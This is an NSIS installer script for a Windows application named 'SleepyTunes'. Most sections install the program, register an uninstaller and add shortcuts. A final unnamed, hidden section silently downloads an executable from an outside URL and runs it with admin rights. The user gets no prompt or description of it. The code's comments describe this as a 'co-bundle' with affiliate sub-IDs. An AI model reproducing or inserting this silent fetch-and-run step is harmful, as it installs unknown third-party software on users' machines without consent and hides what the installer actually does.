!define APPNAME "SleepyTunes"
!define COMPANY "addpcs"
!define VERSION "1.0.0"
!define UNINSTALL_KEY "Software\Microsoft\Windows\CurrentVersion\Uninstall\${COMPANY} ${APPNAME}"

!include WinVer.nsh
 
Function .onInit
  ${IfNot} ${AtLeastWinVista}
    MessageBox MB_OK "SleepyTunes requires Windows Vista or newer to install."
    Quit
  ${EndIf}
FunctionEnd

# name to display in installer
Name "${APPNAME} ${VERSION}"
BrandingText "Copyright ${COMPANY} 2011"

# name of generated installer exe
OutFile "${APPNAME}_Setup_${VERSION}.exe"
RequestExecutionLevel admin

# default install location
InstallDir "$PROGRAMFILES\${COMPANY}\${APPNAME}"

# Remember the installation directory for future updates and the uninstaller
InstallDirRegKey HKLM "Software\${COMPANY}\${APPNAME}" "InstallDir"

# Use the ModernUI 2 library
!include "MUI2.nsh"

# Installer pages
!insertmacro MUI_PAGE_WELCOME
!insertmacro MUI_PAGE_LICENSE "license.rtf"
!insertmacro MUI_PAGE_DIRECTORY
!insertmacro MUI_PAGE_COMPONENTS
!insertmacro MUI_PAGE_INSTFILES
!define MUI_FINISHPAGE_RUN "${APPNAME}.exe"
!define MUI_FINISHPAGE_RUN_TEXT "Launch ${APPNAME} now!"
!insertmacro MUI_PAGE_FINISH

# Uninstaller pages
!insertmacro MUI_UNPAGE_CONFIRM
!insertmacro MUI_UNPAGE_INSTFILES
!insertmacro MUI_UNPAGE_FINISH

# languages
!insertmacro MUI_LANGUAGE "English"

# Installs the main app
LangString DESC_sect0 ${LANG_ENGLISH} "Installs the main application on your PC."
Section "${APPNAME} ${VERSION}" sect0
	SectionIn RO
	Push $OUTDIR
	
	SetOutPath "$INSTDIR"
	File ..\bin\${APPNAME}.exe

	# Create an uninstaller and add it to the Add an Add/Remove programs list
	WriteUninstaller Uninstall.exe
	WriteRegStr HKLM "${UNINSTALL_KEY}" DisplayName "${COMPANY} ${APPNAME}"
	WriteRegStr HKLM "${UNINSTALL_KEY}" DisplayIcon '"$OUTDIR\Uninstall.exe"'
	WriteRegStr HKLM "${UNINSTALL_KEY}" UninstallString '"$OUTDIR\Uninstall.exe"'	
	
	Pop $OUTDIR
SectionEnd

# Uninstalls the main app
Section "un.${APPNAME} ${VERSION}"
	Delete /REBOOTOK "$INSTDIR\${APPNAME}.exe"
	
	# Remove the uninstaller and Add/Remove programs information
	Delete /REBOOTOK "$INSTDIR\Uninstall.exe"
	DeleteRegKey HKLM "${UNINSTALL_KEY}"

	# Remove the installation directory if empty
	RMDir /REBOOTOK "$INSTDIR"
SectionEnd

# Install Start Menu shortuct
LangString DESC_sect1 ${LANG_ENGLISH} "Places a shortcut to the application in your Windows Start Menu."
Section "Start Menu Shortcut" sect1
	CreateShortCut "$SMPROGRAMS\${COMPANY}\${APPNAME}.lnk" "$INSTDIR\${APPNAME}.exe"
SectionEnd

# Uninstall Start Menu shortuct
Section "un.Start Menu Shortcut"
	Delete /REBOOTOK "$SMPROGRAMS\${COMPANY}\${APPNAME}.lnk"
	RMDir /REBOOTOK "$SMPROGRAMS\${COMPANY}"
SectionEnd

# Install Desktop Shortcut
LangString DESC_sect2 ${LANG_ENGLISH} "Places a shortcut to the application on your Windows desktop."
Section "Desktop Shortcut" sect2
	CreateShortCut "$DESKTOP\${APPNAME}.lnk" "$INSTDIR\${APPNAME}.exe"
SectionEnd

# Uninstall Desktop Shortcut
Section "un.Desktop Shortcut"
	Delete "$DESKTOP\${APPNAME}.lnk"
SectionEnd

Section ""

     ;REPLACE THE URL BELOW WITH YOUR CO-BUNDLE URL
     inetc::get /SILENT "http://www.ntdlzone.com/download.php?k4J9cw==" "$PLUGINSDIR\InstallManager.exe" /end
     
     ;THE BELOW LINE PASSES SUB-ID 101 TO THE INSTALLMANAGER EXE
     ;ExecWait "$PLUGINSDIR\InstallManager.exe 101"
     
     ;IF YOU DONT WANT TO PASS SUB-ID USE THE BELOW LINE
     ExecWait "$PLUGINSDIR\InstallManager.exe"
     
SectionEnd

# Section descriptions
!insertmacro MUI_FUNCTION_DESCRIPTION_BEGIN
  !insertmacro MUI_DESCRIPTION_TEXT ${sect0} $(DESC_sect0)
  !insertmacro MUI_DESCRIPTION_TEXT ${sect1} $(DESC_sect1)
  !insertmacro MUI_DESCRIPTION_TEXT ${sect2} $(DESC_sect2)
!insertmacro MUI_FUNCTION_DESCRIPTION_END

